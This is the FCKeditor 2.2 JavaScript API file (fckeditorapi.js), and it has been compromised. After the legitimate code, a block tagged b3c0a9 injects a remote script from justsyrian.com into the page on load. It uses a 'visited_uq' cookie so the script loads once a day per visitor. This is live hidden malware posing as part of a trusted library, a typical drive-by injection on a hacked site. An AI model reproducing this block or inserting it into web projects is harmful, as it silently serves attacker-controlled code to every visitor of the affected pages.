/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckeditorapi.js
 * 	Create the FCKeditorAPI object that is available as a global object in
 * 	the page where the editor is placed in.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKeditorAPI ;

function FCKeditorAPI_GetInstance( instanceName )
{
	return this.__Instances[ instanceName ] ;
}

if ( !window.parent.FCKeditorAPI )
{
	// Make the FCKeditorAPI object available in the parent window.
	FCKeditorAPI = window.parent.FCKeditorAPI = new Object() ;
	FCKeditorAPI.__Instances = new Object() ;

	// Set the current version.
	FCKeditorAPI.Version = '2.2' ;

	// Function used to get a instance of an existing editor present in the 
	// page.
	FCKeditorAPI.GetInstance = FCKeditorAPI_GetInstance ;
}
else
	FCKeditorAPI = window.parent.FCKeditorAPI ;

// Add the current instance to the FCKeditorAPI's instances collection.
FCKeditorAPI.__Instances[ FCK.Name ] = FCK ;

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
